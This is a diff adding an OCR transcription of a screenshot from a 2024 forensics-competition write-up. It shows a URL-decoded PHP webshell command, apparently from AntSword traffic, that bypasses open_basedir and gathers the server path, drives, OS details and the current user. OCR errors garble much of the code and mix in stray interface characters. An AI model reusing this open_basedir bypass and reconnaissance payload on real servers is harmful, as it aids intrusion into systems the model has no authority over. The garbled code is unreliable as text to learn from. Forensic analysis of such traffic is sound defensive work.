@@ -1,0 +1,24 @@
+# OCR: 621f69745d981ae3b1afa3fc5a57a891.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/621f69745d981ae3b1afa3fc5a57a891.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Recipe URLDecode
+日
+Input
+口 +
+国
+%40ini_set(%22display_errors%22%2c%20%22e%22)%3B%40set_timelimit(e)%3B%24opdir%3D%4eini_get(%22open_basedir%22)%3Bif(%2 40pdir)%28%7B%240parr%3Dpreg_sp1it(%22%2F%SC%5C%5C%5C%7C%5C%2F%2F%22%2C%240pdir）%38%24ocwd%3Ddirname(%24_SERVER%5B%22SCR IPT_FILENAME%22%5D)%3B%24tmdir%3D%22.71bec4%22%3B%40mkdir(%24tmdir)%3B%4echdir(%24tmdir)%3B%40ini_set(%22open_ba5edir%22%2C%22..%22)%3Bfor(%24i%3De%3B%24i%3Csizeof(%24oparr)%3B%241%2B%28）)%7B%4@chdir(%22..%22)%38%7D%4eini_set(%22open_basedir%22%2C%22%2F%22)%3B%4@rmdir(%24ocwd.%22%2F%22.%24tmdir)%3B%7D%3Bfunction%2@asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunct 1on%2easoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%2e%22db5d2%22.%229ffec4%22%3Becho%2e%4easenc(%2 4output)%3Becho%20%222f53%22.%2225eb2%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAHE%22%5D)%3 B1f(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D）%3B%24R%3D%22%7B%24D%7D%09%22%3B1f(Substr(%24D%2C8%2C1)1%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%2e%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7De1se%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%e9%22%3B%24u%3D(function_ex1sts（%22pos1x_geteg1d%22）)%3F%40posix_g etpwuid(%4eposix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%4eget_current_user()%3B%24R.%3Dphp_uname(
+)%3B%24R.%3D%22%9%7B%24s%7D%22%3Becho%2e%24R%3B%3B%7Dcatch(Except10n%2e%24e)%7Becho%2e%22ERR0R%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B
+ 1478 Output
+@ini_set("display_errors"，"e")@set_time_limit(e);$opdir-@ini_get("open_basedir");if(Sopdir)
+Tr Raur Bytes
+a
+石
+F
+用
+(Soparr=preg_split("/IllV/V/-Sopdir);Socwd=dirname($_SERVER["SCRIPT_FILENAME");stmdir=".71bec4";@mkdir($tmdir);@chdir(stmdir):@ini_set("open_basedir","..");for(si=e;si<sizeof(soparr);si++)
+(@chdir("-,");)@ini_set("open_basedir","/");@rmdir($ocwd."/".stmdir););functionasenc(Sout)(returnSout;);function asoutput()(Soutput=ob_get_contents();ob_end_clean();echo"db5d2"."gffec4"jecho@asenc(Soutput);echo
+"2f53"."25eb2";}ob_start();try[SD-dirname($_SERVER["SCRIPT_FILENAME"J);if(SD--"")SD-dirname($_SERVER["PATH_TRANSLATED"]);SR-"(SD)"";if(substr(SD,e,1)!-"/")(foreach(range("C","z")as$L)if(is_dir("{$L):"))SR.-"[$L):";else(SR."/":)SR.-"";Su-(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s-(Su)?
+(Ss)";echo $R;;)catch(Exception Se)(echo"ERROR://".Se-
+$u["name"]:@get_current_user(O;sR.=php_uname();$R.=" >getMessage(););asoutput();die();
